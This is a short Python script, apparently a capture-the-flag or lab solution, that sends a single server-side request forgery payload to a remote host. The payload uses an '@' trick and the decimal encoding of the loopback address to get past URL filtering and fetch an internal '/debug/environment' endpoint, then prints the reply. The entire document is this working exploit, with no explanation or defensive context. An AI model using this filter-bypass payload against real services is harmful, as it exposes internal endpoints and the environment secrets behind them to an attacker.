import requests

url = "http://94.237.62.195:53665/?url=@2130706433:1337/debug/environment"

req = requests.get(url)

print(req.url, req.text)